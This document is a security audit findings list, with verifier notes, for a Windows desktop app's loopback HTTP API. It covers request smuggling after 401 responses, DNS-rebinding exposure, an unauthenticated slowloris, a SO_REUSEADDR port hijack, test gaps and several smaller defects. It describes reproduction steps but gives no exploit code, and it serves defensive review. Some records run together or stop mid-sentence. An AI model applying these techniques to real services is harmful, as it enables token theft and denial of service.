findings.title: 401 responses do not drain the request body, desynchronizing the keep-alive connection
findings.why_wrong: `protocol_version = "HTTP/1.1"` (line 574) means connections are keep-alive by default, and `_send_json` sends a Content-Length so `close_connection` stays False. When `do_POST` rejects at line 621, it returns without ever reading the `Content-Length` bytes the client already sent. Those bytes remain in `self.rfile`, so the next iteration of `handle_one_request` parses the *request body* as a new request line.
findings.impact: I reproduced this: sending one `POST /api/voice` with a wrong token and a body consisting of a well-formed `GET /api/state HTTP/1.1` request produces two responses on the wire — the 401, immediately followed by the server's response to the smuggled request. This is textbook request smuggling against a loopback service. Because browsers pool and reuse connections per origin and a `Content-Type: text/plain` POST is a CORS-simple request needing no preflight, a malicious local web page can poison the connection a subsequent same-origin request will read from. Exploitation is bounded by the bearer token today, but the desync is real and it is exactly the primitive that turns any future auth relaxation into a full compromise.
findings.fix: Drain or refuse before responding: in `do_POST`, read and discard `Content-Length` bytes (up to the size cap) before calling `_reject()`, or set `self.close_connection = True` in `_reject()` so the poisoned connection is torn down rather than reused.
findings.verifier_notes: Reproduced. protocol_version = "HTTP/1.1" at server.py:574 and _send_json sends Content-Length (587), so the connection stays alive; do_POST returns at 622 without reading the body. Against the identical handler shape, one POST with a wrong token and a body containing a well-formed request line produced two complete HTTP responses on the wire. Real protocol defect. Impact is smaller than described: the desync only affects the connection the attacker themselves opened and controls the bytes of — a browser cannot read another origin's responses off it, and there is no other client sharing that origin (the Electron shell uses node fetch in a separate process). It matters mainly as latent correctness and as a primitive if auth is ever relaxed. | The desync reproduced exactly as described: one POST with a wrong token and a body containing a well-formed request line produced two responses on the wire - the 401 followed immediately by a 200 for the smuggled GET. protocol_version = 'HTTP/1.1' at server.py:574 and _send_json's Content-Length keep close_connection False, and do_POST at 621 returns before reading the body. But the security consequence does not survive scrutiny: the smuggled request inherits nothing. A browser's connection pool is keyed per-origin and per-page-context, so a malicious local page can only poison a connection that its own subsequent token-less requests would reuse - and those get 401s regardless. The Electron main process uses its own connections and always sends a valid token, so it never takes the 401 branch and its pool is never poisoned. There is no cross-principal confusion and no privilege gained; this is protocol incorrectness with a latent-only security value, which the finding itself concedes ('Exploitation is bounded by the bearer token today').

findings.title: No Host or Origin header validation on any route (DNS-rebinding exposure of the loopback server)
findings.why_wrong: Neither `do_GET` nor `do_POST` nor `_stream` ever inspects `Host` or `Origin`. I grepped the whole `api/` package for `origin` and got zero hits. A loopback HTTP server with no Host check is reachable by any page in any browser on the machine via DNS rebinding: the attacker's domain resolves first to their own IP, then re-resolves to 127.0.0.1, at which point the browser treats `http://attacker.tld:PORT/api/state` as same-origin with the attacker's page — so the same-origin policy and the absence of CORS headers stop protecting anything.
findings.impact: Today the bearer token is the sole barrier, so a rebound page gets 401s. That makes this a defense-in-depth gap rather than an immediate breach — but it is the gap that makes every other weakness on this list reachable from a web page rather than only from a local process: the unauthenticated `TypeError` crash above, the connection desync above, and the unbounded connection fan-out below all become drive-by attacks. There is also no CSRF protection of any other kind on the five state-changing POST routes (`/api/engineer/start`, `/api/engineer/stop`, `/api/learning`, `/api/simulator`, `/api/voice`, `/api/privacy`) — the token is doing all of the work.
findings.fix: Add a check at the top of both verb handlers, before `_reject()`: reject with 403 unless `self.headers.get("Host")` is exactly `127.0.0.1:<port>` or `localhost:<port>`, and unless `Origin`, when present, is absent or matches that same authority. Also require `Content-Type: application/json` on POSTs, which makes the route non-simple and forces a preflight that no CORS header will satisfy.
findings.verifier_notes: Verified: grepping the whole api/ package for header access returns only server.py:580 (Authorization) and 623 (Content-Length) — no Host, no Origin, no CORS logic anywhere, and neither do_GET, do_POST nor _stream inspects them. The finder is candid that the bearer token blocks a rebound page today. Two things further limit it: the port is ephemeral (`ThreadingHTTPServer((bind, 0), ...)` at line 500), so a rebinding attacker must also guess it, and the token is 32 bytes of secrets.token_urlsafe. This is a legitimate hardening gap but purely defense-in-depth. | Verified: I grepped the whole src/ssc_engineer/api/ package for origin/Host/hostname and got zero hits, and neither do_GET (598), do_POST (619) nor _stream (637) inspects either header. The DNS-rebinding mechanics as described are correct. But the finding is explicitly conditional on itself - 'Today the bearer token is the sole barrier, so a rebound page gets 401s' - and the token is a 32-byte secrets.token_urlsafe value regenerated per launch (server.py:495) that is never exposed to any web context, so a rebound page gets nothing but 401s. The chained impact it claims (making findings 1, 8 and 10 drive-by) is partly wrong: browsers will not emit the non-ASCII Authorization header of finding 1 or the malformed Content-Length of finding 3 via fetch, and finding 10's slowloris needs raw sockets a page does not have. Genuine defense-in-depth gap, no constructible failure.

findings.title: Unbounded connections with no socket timeout: unauthenticated local slowloris parks handler threads forever
findings.quote:
self._server = ThreadingHTTPServer((bind, 0), self._handler_class())
        self._server.daemon_threads = True
findings.why_wrong: `ThreadingHTTPServer` spawns one thread per accepted connection with no cap, and the thread is created *before* any authentication runs. The `Handler` class (line 573) never sets a `timeout` attribute, and `BaseHTTPRequestHandler.timeout` is `None` by default (I verified in the interpreter), so `self.rfile.readline()` in `handle_one_request` blocks indefinitely on a connection that never sends a request line. `_stream` adds a second unbounded resource: every `/api/stream` connection gets a thread looping `api.state()` at 2 Hz forever, and there is no limit on how many concurrent streams may exist.
findings.impact: Any local process — no token required — can open a few thousand TCP connections to the discovered port and send nothing, parking one thread apiece until the host runs out of threads and stops serving the shell mid-race. The negative-`Content-Length` hang documented above is the authenticated variant of the same problem. The validation suite tests the opposite direction only (`shell_api_scenarios.py:210-216` fires 32 concurrent *well-behaved* reads and asserts they all return 200); nothing tests a misbehaving client.
findings.fix: Set `timeout = 10` on the `Handler` class (BaseHTTPRequestHandler honours it and calls `handle_timeout`), and cap concurrency — either subclass `ThreadingHTTPServer.process_request` to refuse beyond N live connections, or gate on a `threading.BoundedSemaphore`. Cap concurrent `/api/stream` subscribers at a small number (the shell only ever needs one).
findings.verifier_notes: Confirmed. server.py:500-501 is verbatim, the Handler class (573-577) sets no `timeout`, and I verified in the interpreter that `BaseHTTPRequestHandler.timeout is None`. The block in handle_one_request's readline() happens before any handler code, so this is genuinely pre-auth — unlike findings 3 and 7, no token is needed. `_stream` (637-650) is a second unbounded resource: one thread per connection looping at STATE_INTERVAL_S forever with no concurrency cap. Correctly rated. | Confirmed by direct verification: BaseHTTPRequestHandler.timeout is None in the interpreter, the Handler class at server.py:573 never sets it, and server.py:500-501 constructs a ThreadingHTTPServer with daemon_threads=True and no connection cap. Crucially the thread is spawned by process_request_thread before _reject() ever runs, so this needs no token at all - a local process opening connections and sending no request line parks one thread apiece in rfile.readline() with nothing to reclaim them. _stream adds a second uncapped per-connection thread looping at 2 Hz. The consequence - the runtime host stops serving the pit wall mid-race - is exactly the silent-freeze failure mode this app can least afford, and the unauthenticated reachability is what distinguishes it from finding 3. The precondition (a hostile process already on the machine) keeps it at medium rather than higher.

findings.title: allow_reuse_address is inherited as 1; on Windows that lets another local process hijack the API port
findings.quote: self._server = ThreadingHTTPServer((bind, 0), self._handler_class())
findings.why_wrong: `http.server.HTTPServer` sets `allow_reuse_address = 1` as a class attribute (I verified: `HTTPServer.allow_reuse_address == 1`, inherited by `ThreadingHTTPServer`), and `LocalApiServer` never overrides it, so the listening socket is created with `SO_REUSEADDR`. On POSIX that only relaxes TIME_WAIT reuse, but this application is Windows-only — and Windows `SO_REUSEADDR` has the semantics of POSIX `SO_REUSEPORT`: it permits a *different* socket, in a different process, to bind the same address and port that is already in use, and to take over incoming connections.
findings.impact: Another process running as any user on the machine can bind the same `127.0.0.1:<port>` the runtime host is listening on and intercept the shell's requests — including the `Authorization: Bearer <token>` header main.cjs attaches to every one of them, and every `POST /api/privacy` body. That converts a local-process presence into full token capture plus the ability to feed the pit-wall UI fabricated state documents. The ephemeral port makes this a race rather than a certainty, but nothing in the code prevents it.
findings.fix: Set `allow_reuse_address = False` before binding, and on Windows set `SO_EXCLUSIVEADDRUSE` on the listening socket (subclass `ThreadingHTTPServer` and override `server_bind` to call `setsockopt(SOL_SOCKET, SO_EXCLUSIVEADDRUSE, 1)` before `super().server_bind()`), which is the documented Windows remedy for exactly this hijack.
findings.verifier_notes: Verified in the interpreter: `http.server.HTTPServer.allow_reuse_address == 1`, inherited by ThreadingHTTPServer, and socketserver.TCPServer.server_bind sets SO_REUSEADDR from it. LocalApiServer (492-513) never overrides it. The Windows semantics claim is accurate — Win32 SO_REUSEADDR permits a different process to bind an address:port already in use and take over connections, which is why Microsoft added SO_EXCLUSIVEADDRUSE. Consequence (capturing the Authorization header main.cjs:47 attaches to every request) follows. The ephemeral port makes it a race, as the finder states. | The factual core checks out: I confirmed http.server.HTTPServer.allow_reuse_address == 1 in the interpreter, ThreadingHTTPServer inherits it, LocalApiServer (server.py:493-502) never overrides it and never sets SO_EXCLUSIVEADDRUSE, and socketserver.TCPServer.server_bind applies SO_REUSEADDR from that attribute. The Windows semantics are correctly stated - SO_REUSEADDR there permits a different process to bind an in-use address and take new connections, which is precisely why SO_EXCLUSIVEADDRUSE exists. Downgrading because the concrete attack is narrow and racy: the port is OS-assigned and ephemeral, the attacker must be a local process that discovers it and rebinds during the window before the shell's next connection, and the same attacker would in most cases have easier routes. It is a real missing hardening flag on a Windows-only product, not a medium-grade exposure.

findings.title: Headless shell host installs a crash handler that pops a modal Win32 MessageBox
findings.quote: install_crash_handlers(paths.crash_report, role="shell-host")
findings.why_wrong: `install_crash_handlers` defaults to `show_dialog: bool = True` (crash_reporting.py:264). Both the `sys.excepthook` path (crash_reporting.py:168) and the `threading.excepthook` path (crash_reporting.py:194) call `self.show_dialog(report)`, which on Windows calls `ctypes.windll.user32.MessageBoxW(None, ...)` (crash_reporting.py:229-234) — a blocking, modal, owner-less dialog. But this process is a hidden child: `main.cjs:57` spawns it with `windowsHide: true` and no console, and its entire lifecycle is `while sys.stdin.readline()` (__main__.py:38) terminated by stdin EOF.
findings.impact: An unhandled exception in any host thread blocks that thread on a modal dialog with no owner window, stacked behind the Electron window where the user may never see it. On the fatal `sys.excepthook` path it blocks process exit, so `main.cjs`'s `stopHost` shutdown (`host.process.stdin.end()`) never completes, the 15-second abandon timer at main.cjs:81 fires, and the shell quits leaving an orphaned host process — which then holds the `Local\SSC_Race_Engineer_Desktop_v06` mutex and blocks the next launch of either the shell or the native app.
findings.fix: Pass `show_dialog=False` from the headless host: `install_crash_handlers(paths.crash_report, role="shell-host", show_dialog=False)`. The parameter already exists; the shell surfaces host death to the user via `host:exit` anyway.
findings.verifier_notes: Confirmed end to end. __main__.py:31 is `install_crash_handlers(paths.crash_report, role="shell-host")` with no show_dialog argument, and crash_reporting.py:264 defaults `show_dialog: bool = True`. Both the sys.excepthook path (168) and the threading.excepthook path (194) call `self.show_dialog(report)`, and show_dialog (crash_reporting.py:217-234) is guarded only by `if not self.show_dialog_enabled or os.name != "nt": return` — on the Windows target it proceeds to a blocking owner-less `MessageBoxW(None, ...)`. main.cjs:57 spawns the host with `windowsHide: true`, and its lifecycle is `while sys.stdin.readline()` (__main__.py:38). The orphan-plus-held-mutex consequence (ui/app.py:54 `Local\\SSC_Race_Engineer_Desktop_v06`, main.cjs:81 15s abandon timer) follows from the code. | Confirmed, including a reachable trigger the finding did not name. install_crash_handlers defaults show_dialog: bool = True (crash_reporting.py:264) and api/__main__.py:31 does not pass it; both the sys.excepthook path (:168) and the threading.excepthook path (:194) call self.show_dialog(report), which reaches ctypes.windll.user32.MessageBoxW(None, ...) findings.title: except KeyError in do_POST silently converts any internal KeyError into a 404
findings.why_wrong: The intent is to catch the `raise KeyError(route)` at line 567 for an unrecognized route. But the `except` wraps the whole `api.command(...)` call, which for `/api/engineer/start` reaches `RuntimeController.start()` and spawns the runtime child, for `/api/privacy` reaches `_voice_config()` and TOML parsing plus `apply_privacy_settings()`, and for `/api/support-bundle` reaches `export_support_bundle()` → `load_effective_config` → `create_support_bundle`. A `KeyError` raised anywhere in that depth — a missing config key, a missing dict entry in the privacy or bundle path — is indistinguishable from an unknown route.
findings.impact: A genuine bug deep in the runtime is reported to the shell as `404 {"error": "not found"}` on a route that plainly exists. `App.tsx`'s `run()` surfaces that as the error string "not found", which tells the engineer nothing and points the next person to debug it at the router rather than at the real fault. Worse, the failure is silent server-side too: `log_message` is a no-op (line 576) and nothing else records it, so there is no trace that a start command failed for an internal reason.
findings.fix: Raise a dedicated exception for unknown routes instead of `KeyError` — e.g. `class UnknownRoute(Exception)` raised at line 567 — and catch only that. Let real `KeyError`s fall into the generic 500 handler that `do_POST` should also grow.

The intended target is the `raise KeyError(route)` at 567. Also true that log_message is a no-op (576) so nothing is recorded. Severity lowered: the misreporting only manifests when a separate latent bug raises KeyError deeper in, so the impact is diagnosability rather than a defect that bites on its own. | The structural defect is real and confirmed: server.py:629-632 wraps the entire api.command(...) call - which for /api/engineer/start reaches RuntimeController.start() and spawns a child, and whose success path returns self.state() and therefore runs all of build_state's presentation helpers - in a bare `except KeyError` whose only intended target is the `raise KeyError(route)` at line 567. The observability half of the impact is also confirmed: log_message is `pass` at line 576, so nothing records it. But I could not construct the failure. I checked the plausible KeyError sources and they are defensively written: ui/presentation.py guards every dict access with isinstance (e.g. :319 checks isinstance(row.get('location'), dict) before :321 row['location']), ui/privacy.py has no bare dict indexing at all, and controller.start()'s only bracket indexing is assignment into the environment dict. So this is a latent over-broad-except that will bite on the next refactor, not a current misbehaviour.

findings.title: Error responses echo raw exception strings containing absolute filesystem paths
findings.quote:
except (ValueError, DesktopError, OSError) as exc:
                    self._send_json(HTTPStatus.BAD_REQUEST, {"error": str(exc)})
findings.why_wrong: `str(exc)` for an `OSError` includes the filename (`[Errno 2] No such file or directory: 'C:\\Users\\<name>\\AppData\\Local\\...'`). At minimum strip path components with `Path(...).name` before formatting exception text into a response.

findings.title: The shell never reads the host's structured refusal, so a second-instance conflict surfaces as "handshake is malformed"
findings.quote:
if (!Number.isInteger(parsed.port) || parsed.port <= 0 || typeof parsed.token !== "string" || !parsed.token) {
    throw new Error("Runtime host handshake is malformed");
findings.why_wrong: The host has a deliberate structured refusal path: when the single-instance mutex is already held it prints `json.dumps({"error": "another SSC Race Engineer host is running"})` and returns 2 (__main__.py:25-29). `parseHandshake` never looks at `parsed.error` — it checks only `port` and `token`, so the refusal is thrown away and replaced with a generic message. There is a second race in `startHost` (main.cjs:59-62): `lines.once("line", resolve)` and `child.once("exit", reject)` both fire for this case, so which message wins is nondeterministic — sometimes "handshake is malformed", sometimes "Runtime host exited with code 2". The validation script does read the field (`shell_api_scenarios.py:71`: `self.error = handshake.get("error")`), so the test harness understands a contract the shipping product does not.

findings.verifier_notes: Confirmed on every hop. __main__.py:25-29 prints `{"error": "another SSC Race Engineer host is running"}` and returns 2; host.cjs:28-34 parseHandshake checks only port and token and never looks at `parsed.error`, throwing the generic message; main.cjs:59-62 does race `lines.once("line", resolve)` against `child.once("exit", reject)`. The validation harness does read the field (shell_api_scenarios.py:71 `self.error = handshake.get("error")`), so the contract genuinely exists and is dropped only in the shipping product. The mutex collision with the native Control Center is real (ui/app.py:54 and :170). A deliberately built error channel discarded at the last hop, on the most likely first-run failure. | Core defect confirmed: __main__.py:25-29 prints json.dumps({'error': 'another SSC Race Engineer host is running'}) and returns 2, host.cjs:28-31 checks only parsed.port and parsed.token and throws the generic 'Runtime host handshake is malformed', and the validation harness does read the field (shell_api_scenarios.py:71 `self.error = handshake.get('error')`) - so a deliberately designed error channel is dropped at the last hop. findings.title: The auth test never actually tests a missing token, and six of seven routes have no auth coverage at all
findings.why_wrong: `_request` calls `add_header("Authorization", ...)` unconditionally. When `token=None`, the f-string interpolates the string `"None"`, so the request goes out with `Authorization: Bearer None` — a *wrong* token, not a missing header. The test named `test_rejects_missing_or_wrong_token` therefore exercises two wrong-token cases and zero missing-header cases. The path where `self.headers.get("Authorization", "")` returns the empty-string default is never executed. The validation script gets this right (`shell_api_scenarios.py:91`: `if token is not None:`), which makes the omission in the unit test a straightforward copy error.
findings.impact: The one test standing guard over the entire trust boundary does not test the boundary's most basic case. Beyond that, `test_rejects_missing_or_wrong_token` only hits `/api/state`: there is no auth assertion anywhere in the file for `/api/diagnostics`, `/api/data`, `/api/settings`, `/api/practice`, `/api/replay`, `/api/stream`, or *any* POST route. A regression that dropped `_reject()` from `do_POST` — leaving start/stop, privacy writes and voice toggles wide open to every local process — would pass this suite green. There is also no test for oversized bodies, malformed `Content-Length`, non-ASCII `Authorization`, `Host`/`Origin`, or two instances racing for the port.
findings.fix: Fix the helper (`if token is not None: request.add_header(...)`) so `None` means no header, then parametrize the auth assertion across every route and both verbs — a single loop over `[("GET", "/api/state"), ("GET", "/api/diagnostics"), ..., ("POST", "/api/privacy")]` asserting 401 for both a missing and a wrong token. Add the malformed-request cases as regression tests for the defects above.
findings.verifier_notes: Exact. tests/api/test_shell_api.py:130 is `request.add_header("Authorization", f"Bearer {self.server.token if token == '' else token}")`, unconditional, so `token=None` sends the literal `Bearer None` — a wrong token, never a missing header. The `self.headers.get("Authorization", "")` default branch at server.py:580 is never exercised. I grepped the file: the only 401 assertion is lines 136-140 and it only hits /api/state; there is no auth assertion for /api/diagnostics, /api/data, /api/settings, /api/practice, /api/replay, /api/stream or any POST route (line 319 re-adds a valid token for a different test). The validation script gets it right at shell_api_scenarios.py:91 (`if token is not None:`), which confirms the unit test is a copy error. A regression dropping _reject() from do_POST would pass green. | Confirmed precisely, including the copy-error diagnosis. tests/api/test_shell_api.py:130 is `request.add_header('Authorization', f'Bearer {self.server.token if token == \'\' else token}')` with no guard, so token=None interpolates the literal string and sends 'Authorization: Bearer None' - a wrong token, never a missing header. The sibling harness gets it right at scripts/validation/shell_api_scenarios.py:91 with `if token is not None:`, which confirms the intended contract. That is a genuine hole in the one test guarding the trust boundary.

findings.title: GET /api/state has a process-spawning side effect via ensure_learning()
findings.quote:
def state(self) -> dict[str, Any]:
        with self._lock:
            simulator, voice = self.simulator, self.voice
        self.host.ensure_learning()
findings.why_wrong: `state()` is the handler for `GET /api/state` (line 602) and is also the body of every SSE tick (line 645, twice per second). `ensure_learning()` is not a read: `RuntimeController.ensure_learning` (ui/controller.py:222-240) takes the controller's RLock and can call `self.start(simulator=..., voice=False, quiet_learning=True)`, which spawns a runtime child process. A GET that spawns a process violates HTTP safe-method semantics, and it means the API's read path is serialized behind the controller lock that start/stop also hold.
findings.impact: Two concrete consequences. First, an unauthenticated-looking read is actually a write: anything that polls `/api/state` — including the soak script's `READ_ROUTES` loop and the shell's bootstrap fetch — can trigger child-process creation, and with `ThreadingHTTPServer` several concurrent `/api/state` requests contend on the controller RLock while one of them is spawning. Second, the SSE loop calls it at 2 Hz for the entire duration of a multi-hour endurance race. The 30-second `_learning_retry_at` backoff limits actual spawns, but the lock acquisition and status recomputation happen on every single tick.
findings.fix: Drive quiet learning from a dedicated timer thread in `LocalApiServer` (or from `RuntimeController` itself) rather than from the request path, and make `state()` a pure read of the current snapshot.
findings.verifier_notes: Code-true: server.py:515-518 shows `state()` calling `self.host.ensure_learning()`, it is the GET handler at 602 and the SSE tick body at 645, and controller.py:222-240 confirms ensure_learning takes `self._lock` and can call `self.start(simulator=..., voice=False, quiet_learning=True)`, spawning a runtime child. Severity lowered: the finder's own concession is decisive — `self._learning_retry_at = time.monotonic() + 30.0` bounds actual spawns to one per 30s, the method returns early unless `_learning_enabled`, and RuntimeController's RLock serializes it correctly. What remains is an HTTP-semantics violation and per-tick lock acquisition, i.e. a design smell rather than a production failure. | Code claim confirmed: server.py:515-521 state() calls self.host.ensure_learning() and is the handler for GET /api/state (602) as well as the SSE tick body (645), and controller.py:222-240 ensure_learning() takes the RLock and can call self.start(..., quiet_learning=True), which spawns a child process - so a GET is not a safe method. Downgrading because the two stated consequences largely dissolve on inspection. The lock-contention argument is moot: state() also calls self.host.desktop_snapshot(), which takes the same RLock at controller.py:354 unconditionally, so the read path is serialized by design whether or not ensure_learning exists. And the spawn is bounded by `self._learning_retry_at = time.monotonic() + 30.0` set before the start attempt, with ensure_learning catching (OSError, ValueError, DesktopError) itself, so no amount of polling produces more than one spawn attempt per 30 s. What remains is an HTTP-semantics violation and an architectural surprise, not an exploitable or race-critical defect.

findings.title: Every SSE tick re-reads and re-parses the race plan file from disk, twice per second for the whole race
findings.quote: state["race_plan"] = race_plan_summary(self.paths.race_plan)
findings.why_wrong: `race_plan_summary` calls `load_race_plan` (race_plan_io.py:266-285), which does `Path(...).resolve()`, `is_file()`, `stat()` for the size bound, `read_text()`, `json.loads()`, and `race_plan_from_dict()` — a full parse and object construction. `state()` is the SSE tick body (line 645) running at `STATE_INTERVAL_S = 0.5`, and it is also re-run on every `/api/state` GET and as the return value of every successful POST command (line 568). There is no caching and no mtime check.
findings.impact: Roughly 7,200 full file reads and JSON parses per hour of a race, plus a `resolve()` and `stat()` each, all on the shell's live-update path, for a file that changes only when the engineer saves a plan in the native editor. On Windows this also means the plan file is opened twice a second, which raises the odds of colliding with `save_race_plan`'s temp-file rename (race_plan_io.py:292-296) and of tripping the sharing-violation `OSError` that `load_race_plan` converts into a `RacePlanError` shown to the user as a plan error.
findings.fix: Cache the parsed summary keyed on the file's `st_mtime_ns` and `st_size`, recomputing only when they change. The same applies to `data_overview`/`practice_overview` opening SQLite on each call.
findings.verifier_notes: Accurate: server.py:520 `state["race_plan"] = race_plan_summary(self.paths.race_plan)` sits in `state()`, which is the SSE tick body at 645 with STATE_INTERVAL_S, the GET handler at 602, and the return of every command at 568. race_plan_io.py:266-285 confirms resolve(), is_file(), stat(), read_text(), json.loads() and race_plan_from_dict() with no cache or mtime check. Severity lowered: a few thousand reads per hour of a small bounded JSON file is negligible on any modern machine, and the Windows sharing-violation race against save_race_plan's `temporary.replace(selected)` (race_plan_io.py:300) is both rare and already degraded gracefully — load_race_plan converts it to RacePlanError and race_plan_summary at 289-291 returns it as a displayed plan error rather than failing the tick. | The mechanism is confirmed - server.py:520 calls race_plan_summary(self.paths.race_plan) inside state(), which is the 0.5 s SSE tick body, and load_race_plan (race_plan_io.py:266-285) does resolve(), is_file(), stat(), read_text() and json.loads() with no mtime check or cache. But the half of the impact that would actually hurt is unreachable. I traced every save_race_plan caller: ui/race_plan_editor.py:390 (the native Control Center) and cli_commands.py:31/40. The native editor cannot run concurrently with the shell host - both take the same single-instance mutex (api/__main__.py:24 _acquire_single_instance, ui/app.py:170), and the host exits with code 2 if the native app holds it - so the temporary.replace(selected) at race_plan_io.py:296 can never collide with the shell's reads in the shipping configuration. Only a manually-run CLI could, which is a marginal path. What is left is ~7,200 reads and parses per hour of a small, size-bounded JSON file: wasteful and worth caching, but not a production bite.

findings.title: Failed authentication attempts are never logged; the server has no audit trail whatsoever
findings.quote:
def log_message(self, format: str, *args: Any) -> None:
                pass  # ponytail: quiet; the runtime keeps its own structured log
findings.why_wrong: `log_message` is suppressed entirely, and `_reject()` (line 592) writes the 401 without recording anything anywhere. The comment claims "the runtime keeps its own structured log" — but the runtime's `StructuredLogger` belongs to `RuntimeController` and is never wired into `LocalApiServer`; there is no logger reference anywhere in `api/server.py`. The result is that the service has zero observability: not one line is emitted for a rejected request, an unknown route, a malformed body, or a 400.
findings.impact: Any local process probing the API — brute-forcing the token, port-scanning for the service, or exploiting the crash and desync defects above — leaves no trace at all. If a user reports that their engineer stopped or their privacy settings changed unexpectedly, there is no record of who called what. The support bundle collects structured logs (support.py:138-143), so an incident involving the loopback API produces a bundle containing nothing about it.
findings.fix: Pass the runtime's `StructuredLogger` into `LocalApiServer` and log at minimum: every 401 with the peer address, every 4xx with route and reason, and stream connect/disconnect. Keep request bodies out of the log.
findings.verifier_notes: Confirmed. server.py:576-577 is verbatim (`pass  # ponytail: quiet; the runtime keeps its own structured log`), _reject at 592-596 records nothing, and a grep of the entire api/ package for 'logger' returns zero hits — the comment's claim that the runtime keeps a log does not apply to this server, which has no logger reference at all. Correctly rated low. | Confirmed by reading. server.py:576-577 is `def log_message(self, format, *args): pass`, _reject() at 592-596 writes the 401 and records nothing, and I grepped api/server.py - there is no logger reference of any kind in the file, so the comment's claim that 'the runtime keeps its own structured log' does not apply to this surface: StructuredLogger belongs to RuntimeController (controller.py:200, _detach_log at 571) and is never wired into LocalApiServer. The consequence follows: nothing records a rejected request, an unknown route, a malformed body or a 400, and since support.py collects only the structured logs, a bundle exported after an incident on this API contains no evidence of it. Correctly rated low - it is an observability gap that makes other problems harder to diagnose rather than a defect that itself misbehaves.

findings.title: self.simulator is read outside the lock in command()
findings.quote: simulator = str(body.get("simulator") or self.simulator)
findings.why_wrong: Every other access to `self.simulator` and `self.voice` in this class is wrapped in `with self._lock` (lines 516-517, 529-530, 535-536, 540-541, 544-545) — this one is not. Because the server is a `ThreadingHTTPServer`, two concurrent POSTs genuinely execute `command()` in parallel. A second, larger gap: the lock only protects the two scalar fields, not the `self.host.start(...)` / `self.host.stop(...)` calls at lines 531 and 533, so two concurrent `POST /api/engineer/start` requests both pass through and both invoke `host.start()`.
findings.impact: Concurrent commands can interleave such that `self.simulator` is set by one request and `host.start()` is called by another with a different value, so the runtime child is launched for one simulator while the state document reports the other. The validation script explicitly tolerates this rather than testing it (`shell_api_scenarios.py:241-247`: "start while running is refused or idempotent", accepting `{200, 400}`) — the actual behaviour under concurrency is undefined by the code and unasserted by the tests. `RuntimeController` has its own RLock, which limits the damage, but the API layer's own invariant is unprotected.
findings.fix: Hold `self._lock` across the whole of `command()`, or at minimum across the read at line 524 and the matching mutate-then-dispatch in each branch, so one command completes before the next begins.
findings.verifier_notes: Confirmed: server.py:524 `simulator = str(body.get("simulator") or self.simulator)` is the only unguarded access; 516-517, 529-530, 535-536, 540-541 and 544-545 all use `with self._lock`. Also true that the lock does not span host.start()/host.stop() at 531 and 533. The finder correctly notes RuntimeController's own RLock plus its `if current.running: return current` early-out (controller.py:373-375) limit the real damage to a torn simulator value. Low is right. | Confirmed as stated: server.py:524 reads self.simulator with no lock while every other access in the class is wrapped (516-517, 529-530, 535-536, 540-541, 544-545), and the larger point is right - the lock covers only the two scalar fields, not the host.start()/host.stop() calls at 531 and 533, so ThreadingHTTPServer genuinely allows two /api/engineer/start requests to both pass through. The interleaving described (one request sets self.simulator, another calls host.start() with a different value) is mechanically possible. Kept at low because the damage is well contained: CPython attribute reads are atomic so there is no torn value, RuntimeController.start() takes its own RLock and returns the current status early when already running (controller.py:372-375), and producing the divergence needs two concurrent POSTs from a token-holding client, which in practice means only the single-threaded renderer. Real inconsistency, negligible blast radius.

findings.title: /api/support-bundle is unthrottled and its filename collides at one-second granularity
findings.why_wrong: Three issues. The filename has one-second resolution, and `create_support_bundle` ends with `temporary.replace(path)` (support.py:165), an unconditional overwrite — two bundles requested in the same second silently clobber each other. There is no rate limit, so a client holding the token can request bundles in a loop; each one re-reads the config, summarizes the database, collects device inventory and compresses log tails at `compresslevel=9`, writing a new ZIP into `paths.logs` every time with nothing ever cleaning them up. And the absolute path is returned to the caller, disclosing the `%LOCALAPPDATA%` layout and the Windows username.
findings.impact: Unbounded disk growth in the log folder with no retention policy, an expensive synchronous operation that can be triggered arbitrarily often on the same thread pool that serves live race state (the validation script gives it a 120-second timeout — `shell_api_scenarios.py:279` — so it can block a handler thread for minutes), and a lost bundle whenever two are requested within the same second. Contents are properly redacted via `redact_log_value`, so this is disk and availability rather than disclosure.
findings.fix: Add sub-second or random suffix uniqueness to the filename, refuse to overwrite an existing bundle, throttle the route to one bundle per N seconds, and prune old `ssc-support-*.zip` files. Return only the filename, not the absolute path.
findings.verifier_notes: All three sub-claims verified: server.py:546-549 uses `time.strftime("%Y%m%d_%H%M%S")` (one-second resolution) and returns the absolute path; support.py:165 ends with an unconditional `temporary.replace(path)`; there is no rate limit and no retention anywhere. The expense is real (compresslevel=9 at support.py:161, plus config/database/device collection). Minor citation slip: the 120-second timeout is at shell_api_scenarios.py:398, not :279 — immaterial to the finding. Contents are indeed redacted via redact_log_value, so this is disk and availability only. | All three sub-claims verified. server.py:547-549 builds the name from time.strftime('%Y%m%d_%H%M%S') with one-second resolution, support.py:165 ends with an unconditional temporary.replace(path) so a same-second second bundle silently clobbers the first, the ZipFile is opened with compresslevel=9 (support.py:158-162) making each call expensive, nothing rate-limits the route, nothing prunes paths.logs, and the absolute path is handed back to the caller. The expensive-synchronous-call point is fair - shell_api_scenarios.py allows a 120 s timeout for it, and it runs on the same thread pool that serves live state. The finding is also honest about its own ceiling: contents go through redact_log_value (support.py:125-152), so this is disk growth and availability, not disclosure, and triggering the loop requires the token. Low is the right rating.

findings.title: LocalApiServer.close() blocks forever if start() was never called, and is not idempotent
findings.why_wrong: `__init__` binds the listening socket at line 500, but the serving thread is only started by the separate `start()` at line 509. `BaseServer.shutdown()` sets `__shutdown_request` and then waits on the `__is_shut_down` Event, which is only set by `serve_forever()` on exit — so if `serve_forever` never ran, the Event is never set and `shutdown()` blocks forever. I confirmed this in the interpreter: constructing a `ThreadingHTTPServer` and calling `shutdown()` without `serve_forever()` hangs (the process had to be killed by timeout). `close()` is also not guarded against being called twice.
findings.impact: Latent today, because `__main__.main` calls `start()` immediately after construction (lines 33-34) with nothing in between that can fail. But `close()` is the `finally`-block cleanup (__main__.py:44), so any future code inserted between construction and `start()` that raises turns process shutdown into an unkillable hang — in a process whose only shutdown signal is stdin EOF, which would then be ignored, leaving an orphan holding the single-instance mutex. The constructor also has the side effect of opening a listening socket before the caller has asked for anything to be served.
findings.fix: Bind lazily in `start()` rather than `__init__`, or track whether the serving thread was started and skip `shutdown()` if not. Make `close()` idempotent with a flag, and join `self._thread` with a timeout after `server_close()`.
